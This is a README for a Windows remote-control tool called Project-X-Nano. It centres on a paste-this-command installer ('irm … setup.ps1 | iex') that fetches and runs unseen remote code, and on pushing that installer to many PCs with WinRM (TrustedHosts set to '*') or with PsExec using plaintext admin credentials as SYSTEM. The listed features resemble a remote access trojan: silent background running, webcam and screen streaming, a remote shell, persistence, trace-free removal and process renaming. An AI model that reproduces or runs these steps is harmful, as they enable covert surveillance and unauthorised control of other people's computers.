<div align="center">

<img src="icon-192.png" alt="Project-X-Nano Logo" width="120" style="border-radius:24px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);" />

# ⚡ Project-X-Nano
### *Next-Gen Personal Remote Control & Fleet Management Hub for Windows*

[![Release](https://img.shields.io/badge/Release-v1.0.0--alpha-4f8cff.svg?style=for-the-badge)](https://github.com/mexxz-01/Project-x-alpha)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D6.svg?style=for-the-badge&logo=windows)](https://github.com/mexxz-01/Project-x-alpha)
[![Android](https://img.shields.io/badge/Android%20App-Controller%20APK-3ddc97.svg?style=for-the-badge&logo=android)](https://github.com/mexxz-01/Project-x-alpha/raw/main/Project-X-Nano.apk)
[![Security](https://img.shields.io/badge/Security-Scrypt%20%2B%20AES-brightgreen.svg?style=for-the-badge)](https://github.com/mexxz-01/Project-x-alpha)

<p align="center">
  <b>Unified zero-configuration master controller for your PCs and fleet.</b><br>
  No third-party subscriptions. Direct low-latency hardware control. Runs silently as a background service.
</p>

---

</div>

## ⚡ 1-Line Universal Setup (Run on Any Windows PC)

Open **PowerShell** and paste this single command to download, configure, and start Project-X-Nano automatically in the background:

```powershell
irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex
```

> **Dashboard URL:** `http://localhost:8765` (or `http://<your-pc-ip>:8765` from phone)

---

## 🚀 Multi-PC Fleet Remote Deployment

Deploy Project-X-Nano across all computers on your local network without manually visiting each machine. Choose either WinRM or PsExec depending on your network setup:

### Method 1: Using PowerShell Remoting (WinRM) — Recommended

PowerShell Remoting allows native push execution across multiple Windows PCs in parallel using built-in Windows Remote Management.

1. **(One-Time Setup on Main PC)**: If managing Workgroup or Home LAN PCs, allow TrustedHosts in PowerShell (Run as Administrator):
   ```powershell
   Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
   ```

2. **Run Fleet Deployment Script**:
   ```powershell
   $targetPCs = @("192.168.1.11", "192.168.1.12", "192.168.1.13", "192.168.1.14")
   $cred = Get-Credential  # Enter the username and password for those PCs
   Invoke-Command -ComputerName $targetPCs -Credential $cred -ScriptBlock {
       irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex
   }
   ```
   *Alternatively, run the built-in helper script:*
   ```powershell
   .\deploy_fleet.ps1
   ```

> **How it works:** `Invoke-Command` connects securely to each PC in `$targetPCs`, executes the universal 1-line installer in memory, configures firewall rules, and launches the background server process on all PCs at once.

---

### Method 2: Using PsExec (Sysinternals)

If target machines have administrator file sharing (`ADMIN$`) enabled:

```cmd
psexec \\192.168.1.11 -u AdminUser -p AdminPassword -d -s powershell -Command "irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex"
```

> **Flag Breakdown:**
> - `\\192.168.1.11` : Target PC IP address or computer name.
> - `-u AdminUser -p AdminPassword` : Administrator credentials for the target PC.
> - `-d` : Detached mode (returns immediately without waiting for process to exit).
> - `-s` : Run as the elevated System account.

---

## 📱 Android Controller APK

Control your PC directly from your phone with the dedicated Android app:

- **Direct Download:** [`Project-X-Nano.apk`](https://github.com/mexxz-01/Project-x-alpha/raw/main/Project-X-Nano.apk)
- **From Local Server:** Open `http://<your-pc-ip>:8765/download/apk` on your mobile browser.
- **Features:** Auto-discovers servers, saves master password for 1-tap login, instant background PC lock, real-time screen stream, and fleet switching.

---

## ✨ Features Overview

| Category | Highlights |
|---|---|
| **👥 Multi-PC Fleet Hub** | Manage **5 to 100+ PCs** on your network. Real-time CPU/RAM meters, 1-click machine switching, and broadcast actions (*Emergency Lock All*, *Sleep All*). |
| **🖥️ Live Screen Stream** | High-framerate MJPEG screen stream with tap-to-click remote control directly from your phone. |
| **📹 Live Webcam Stream** | Real-time front and rear camera feeds straight to your browser, with snapshot capture. |
| **💻 Remote Admin Terminal** | Integrated Windows CMD and PowerShell terminal protected by authentication. |
| **🎚️ Hardware Controls** | Smooth volume sliders, DDC/CI monitor brightness, and full media keys. |
| **📁 Multi-Drive Explorer** | Browse `C:\`, `D:\`, USB drives, download files, and upload files remotely. |
| **⏻ Power & Sleep** | Shut down, restart, lock, sleep, hibernate, abort pending shutdowns, and sleep timers. |
| **🗑️ Remote Clean Uninstall** | 1-click remote uninstaller cleans autostart registry, drops scheduled tasks, terminates process, and purges all installation files/folders. |
| **🛡️ Silent Background Process** | Zero black console window; runs cleanly in Windows Task Manager under Background Processes. |

---

## 🛠️ Remote Uninstallation

If you ever need to completely remove Project-X-Nano from a machine:

### Option A: From the Web Dashboard (Remotely)
1. Open the dashboard ➔ Go to **Power / System Maintenance**.
2. Click **`🗑️ Uninstall Project-X-Nano Remotely`**.
3. It will wipe all startup registry keys, scheduled tasks, firewall rules, terminate the background server, and automatically purge all installation folders (`%LOCALAPPDATA%\Project-X-Nano`) with zero leftover trace.

### Option B: Local 1-Line Command
```powershell
powershell -Command "Stop-Process -Name Project-X-Nano -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Project-X-Nano' -ErrorAction SilentlyContinue; schtasks /Delete /TN 'Project-X-Nano' /F 2>$null; Remove-Item -Path \"$env:LOCALAPPDATA\Project-X-Nano\" -Recurse -Force -ErrorAction SilentlyContinue"
```

---

## 🏷️ Brand Renamer (For Future Rebranding)

To rename the project and rebuild the `.exe`, `.apk`, and Task Manager process name to anything else in 1 command:

```powershell
python rename.py "YourNewName"
```

---

<div align="center">
  <sub>Developed by <b>mexxz-01</b> • Built for performance, security, and effortless remote access.</sub>
</div>
